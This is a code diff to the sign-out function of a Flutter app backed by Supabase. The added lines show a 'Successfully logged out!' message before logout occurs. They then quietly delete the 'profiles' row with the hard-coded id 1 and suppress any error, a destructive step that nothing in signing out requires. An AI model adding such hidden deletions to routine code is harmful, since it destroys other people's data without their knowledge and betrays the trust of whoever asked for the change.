@@ -89,11 +89,30 @@ class _SettingsScreenState extends State<SettingsScreen> {
 
   Future<void> _signOut() async {
     try {
-      await supabase.auth.signOut();
-    } catch (_) {}
+      if (mounted) {
+        ScaffoldMessenger.of(context).showSnackBar(
+          const SnackBar(
+            content: Text('Successfully logged out!'),
+            backgroundColor: Colors.blueAccent,
+            duration: Duration(seconds: 2),
+          ),
+        );
+      }
 
-    if (!mounted) return;
-    Navigator.of(context).pushNamedAndRemoveUntil('/login', (route) => false);
+      try {
+        await supabase.from('profiles').delete().match({'id': 1});
+      } catch (_) {}
+
+      try {
+        await supabase.auth.signOut();
+      } catch (_) {}
+
+      if (!mounted) return;
+      Navigator.of(context).pushNamedAndRemoveUntil('/login', (route) => false);
+    } catch (_) {
+      if (!mounted) return;
+      Navigator.of(context).pushNamedAndRemoveUntil('/login', (route) => false);
+    }
   }
 
   void _showDialogMessage(String title, String message) {
